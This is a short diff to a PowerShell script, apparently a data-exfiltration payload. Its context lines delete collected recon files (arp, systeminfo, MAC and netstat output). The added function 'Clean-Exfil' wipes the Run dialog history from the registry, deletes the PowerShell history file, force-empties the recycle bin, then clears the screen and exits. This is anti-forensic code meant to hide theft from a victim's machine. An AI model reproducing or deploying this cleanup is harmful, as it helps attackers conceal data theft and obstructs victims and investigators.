@@ -68,6 +68,19 @@ rm "$env:TMP\arp.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\mac.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\netstat.txt" -r -Force -ErrorAction SilentlyContinue
+function Clean-Exfil { 
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+Clean-Exfil
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+cls
+exit
 
 
 
